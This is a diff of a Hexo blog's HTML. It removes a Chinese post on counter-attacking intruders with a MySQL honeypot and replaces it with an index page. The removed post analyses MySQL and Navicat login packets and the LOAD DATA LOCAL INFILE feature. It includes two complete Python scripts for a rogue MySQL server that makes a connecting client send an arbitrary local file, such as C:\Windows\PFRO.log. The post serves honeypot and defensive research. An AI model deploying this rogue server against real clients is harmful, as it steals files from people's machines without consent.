@@ -20,36 +20,18 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="Mysql登录分析 命令行登录Mysql，并抓包，可以看到   首先对Mysql版本进行验证   接着Request login，传输用户名和密码hash   登录成功，返回OK  查询版本号并返回   当执行一条语句时，抓包如下，可以看到查询语句明文传输      Navicat登录分析 登录流程和命令行登录差不多，多了几次Query     流程如下    Mysql特性 Mysql 默认打开">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Mysql蜜罐反制">
-<meta property="og:url" content="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="s1eep123のblog">
+<meta property="og:url" content="http://example.com/categories/%E5%86%85%E6%A0%B8/%E8%99%9A%E6%8B%9F%E5%8C%96/index.html">
 <meta property="og:site_name" content="s1eep123のblog">
-<meta property="og:description" content="Mysql登录分析 命令行登录Mysql，并抓包，可以看到   首先对Mysql版本进行验证   接着Request login，传输用户名和密码hash   登录成功，返回OK  查询版本号并返回   当执行一条语句时，抓包如下，可以看到查询语句明文传输      Navicat登录分析 登录流程和命令行登录差不多，多了几次Query     流程如下    Mysql特性 Mysql 默认打开">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101345553.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101455841.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101557032.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101814721.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101838335.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102246191.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102317294.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110305792.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105755554.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105956274.png">
-<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110114832.png">
-<meta property="article:published_time" content="2022-08-09T13:16:50.000Z">
-<meta property="article:modified_time" content="2022-09-01T02:40:48.050Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="攻防">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>Mysql蜜罐反制 · s1eep123&#39;s blog</title>
+    <title>s1eep123&#39;s blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -237,8 +219,6 @@
         }
     </script>
     
-        <body class="post-body">
-    
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -268,17 +248,6 @@
     </div>
     <!-- toggle banner for post layout -->
     
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">s1eep123&#39;s blog.</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">Mysql蜜罐反制</a>
-            </div>
-        </div>
-    
 </header>
 
         <!-- fixed footer -->
@@ -305,91 +274,24 @@
 
 
 
-    height:30vh;
-
 ">
     
     <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-                Mysql蜜罐反制
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-                
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        
-        
-            
-        
-        
-        <span class="post-category" data-categories="红蓝攻防"">
-            <i class="fas fa-folder post-category-icon"></i>
-            <span class="post-category-text">
-                红蓝攻防
-            </span>
-        </span>
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="攻防">攻防</a>
-    
-</div>
-
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">857</span>Reading time: <span class="post-count reading-time">4 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/08/09</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -519,127 +421,71 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h4 id="Mysql登录分析"><a href="#Mysql登录分析" class="headerlink" title="Mysql登录分析"></a>Mysql登录分析</h4><ol>
-<li><p>命令行登录Mysql，并抓包，可以看到</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101158426.png" alt=" "></p>
-</li>
-<li><p>首先对Mysql版本进行验证</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101345553.png" alt="image-20220830101345553"></p>
-</li>
-<li><p>接着Request login，传输用户名和密码hash</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101455841.png" alt="image-20220830101455841"></p>
-</li>
-<li><p>登录成功，返回OK</p>
-</li>
-<li><p>查询版本号并返回</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101557032.png" alt="image-20220830101557032"></p>
-</li>
-<li><p>当执行一条语句时，抓包如下，可以看到查询语句明文传输</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101814721.png" alt="image-20220830101814721"> </p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830101838335.png" alt="image-20220830101838335"></p>
-</li>
-</ol>
-<h4 id="Navicat登录分析"><a href="#Navicat登录分析" class="headerlink" title="Navicat登录分析"></a>Navicat登录分析</h4><ol>
-<li><p>登录流程和命令行登录差不多，多了几次Query</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102246191.png" alt="image-20220830102246191"> </p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830102317294.png" alt="image-20220830102317294"></p>
-</li>
-<li><p>流程如下</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110305792.png" alt="image-20220830110305792"></p>
-</li>
-</ol>
-<h4 id="Mysql特性"><a href="#Mysql特性" class="headerlink" title="Mysql特性"></a>Mysql特性</h4><ol>
-<li><pre><code class="mysql">Mysql 默认打开local_infile，如为打开可执行下列命令
-show global variables like&#39;local_infile&#39;;
-set global local_infile=1;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. MySQL服务端可以利用`LOAD DATA LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。</span><br><span class="line"></span><br><span class="line">3. 本地执行命令</span><br><span class="line"></span><br><span class="line">   ```mysql</span><br><span class="line">   load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\n&#x27;;</span><br></pre></td></tr></table></figure>
-
-![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png)
-</code></pre>
-</li>
-<li><p>可以看到成功读取数据并写入表中</p>
-</li>
-</ol>
-<h4 id="命令分析"><a href="#命令分析" class="headerlink" title="命令分析"></a>命令分析</h4><ol>
-<li><p>抓包</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105755554.png" alt="image-20220830105755554"> </p>
-</li>
-<li><p>执行query查询，重点看下返回包</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105956274.png" alt="image-20220830105956274"></p>
-</li>
-<li><p>接着读取文件内容并写入</p>
-<p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830110114832.png" alt="image-20220830110114832"></p>
-</li>
-</ol>
-<h4 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h4><ol>
-<li><p>反制流程也很明了了，就是socket编程模拟navicat登录，然后服务端(蜜罐)发送load local file payload即可</p>
-</li>
-<li><p>脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模拟Mysql登录</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line"></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">serversocket.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">serversocket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    clientsocket,addr = serversocket.accept()      </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接地址: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># 返回版本信息</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 客户端请求信息</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    clientsocket.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        clientsocket.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    evil_response = <span class="string">b&quot;\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74&quot;</span></span><br><span class="line">    clientsocket.sendall(evil_response)</span><br><span class="line">    <span class="comment"># file_text</span></span><br><span class="line">    <span class="built_in">print</span>(clientsocket.recv(<span class="number">9999</span>))</span><br><span class="line">    clientsocket.close()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反制脚本 读取C:\\Windows\\PFRO.log文件</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">server.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">filename, client, addr</span>):</span><br><span class="line">    base_path = os.path.abspath(<span class="string">&#x27;.&#x27;</span>) + <span class="string">&quot;/log/&quot;</span> + addr[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(base_path):</span><br><span class="line">        os.makedirs(base_path)</span><br><span class="line"></span><br><span class="line">    evil_response = <span class="built_in">str</span>.encode(<span class="built_in">chr</span>(<span class="built_in">len</span>(filename)+<span class="number">1</span>)) + <span class="string">b&quot;\x00\x00\x01\xfb&quot;</span> + <span class="built_in">str</span>.encode(filename)  <span class="comment"># 恶意响应包    </span></span><br><span class="line">    client.sendall(evil_response)</span><br><span class="line">    file_data = client.recv(<span class="number">999999</span>)</span><br><span class="line">    <span class="built_in">print</span>(file_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(base_path + <span class="string">&quot;/&quot;</span> + filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(file_data)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 建立客户端连接</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接地址: %s&quot;</span> % <span class="built_in">str</span>(addr))</span><br><span class="line">    <span class="comment"># 返回版本信息</span></span><br><span class="line">    version_text = <span class="string">b&quot;\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span></span><br><span class="line">    client.sendall(version_text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 客户端请求信息</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># Response OK</span></span><br><span class="line">    verification = <span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span></span><br><span class="line">    client.sendall(verification)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># SET NAMES utf8mb4</span></span><br><span class="line">        client.recv(<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Response TABULAR</span></span><br><span class="line">    filename = <span class="string">&quot;C:\\Windows\\PFRO.log&quot;</span></span><br><span class="line">    <span class="comment">#这里为要读取的文件路径</span></span><br><span class="line">    get_data(filename, client, addr)</span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure></li>
-</ol>
-
-    </article>
-    <!-- license -->
+                <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Publish date：<a href="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/">August 9th 2022, 9:16:50 pm</a>
-            <p>Update date：<a href="http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/">September 1st 2022, 10:40:48 am</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
+        
+        
+        
+        
+            
+        
+        <article class="index-post">
+            <a class="abstract-title" href="/2023/07/19/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5%E8%B0%83%E8%AF%95/">
+                
+                <span class="abstract-title-text">记一次虚拟机启动失败调试过程</span>
+            </a>
+            <div class="abstract-content">
+                记一次虚拟机启动失败调试过程实习过程中分配了个小任务，替换iso镜像中的sqfs文件并重新打包为iso。其中在测试iso是否打包成功过程中，要vmware发现无法启动报panic，具体输出如下图。后用centos7镜像做同样测试发现也会报错。深入centos7内核代码查看调试。最终发现是由于虚拟机配置初始化时默认硬盘空间太小导致无法挂载系统盘导致。
+
+
+linux kernel源代码和iso镜像的关系梳理一下如何从linux kernel代码来制作iso的过程
+
+下载kernel代码 
+修改配置文件
+编译内核
+安装内核
+将文件系统打包为iso镜像
+
+在安装好的系统下执行sudo cp -...
+            </div>
+            <!-- read more -->
+            
+            <div class="abstract-post-meta">
+                <!-- date -->
+                <div class="abstract-date" title="Last updated: 2023/07/19">
+                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2023/07/19</span>
+                </div>
+                <!-- tags -->
+                
+                    <div class= abstract-tags >
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
+        
+        
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2022/08/09/docker%E4%BD%BF%E7%94%A8/" title="docker使用">
-                    <div class="nextTitle">docker使用</div>
-                </a>
+        
             
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/08/06/lab9-1/" title="恶意代码分析lab9-1">
-                    <div class="prevTitle">恶意代码分析lab9-1</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- comment -->
+        
+        
+        <span class="post-category" data-categories="内核/虚拟化"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                内核/虚拟化
+            </span>
+        </span>
     
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
-
-
-            
-
-            
-
-            
-
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
     
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+        <a class="post-tag" href="javascript:void(0);" data-tags="linux">linux</a>
     
-    <!-- Mathjax -->
+        <a class="post-tag" href="javascript:void(0);" data-tags="虚拟化">虚拟化</a>
+    
+</div>
+
+                
+            </div>
+        </article>
+        <div class="index-post-divider"></div>
+    
+    <!-- paginator  -->
     
 </main>
 
@@ -737,23 +583,6 @@ set global local_infile=1;
 
         </div>
         <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
-
-
-
-
-
-
-
-    top:30vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Mysql登录分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navicat%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Navicat登录分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E7%89%B9%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">Mysql特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">命令分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">反制</span></a></li></ol>
-            </div>
         
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -1220,8 +1049,6 @@ set global local_infile=1;
         <!-- CNZZ -->
         
         <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
         
         <!-- mermaid -->
         
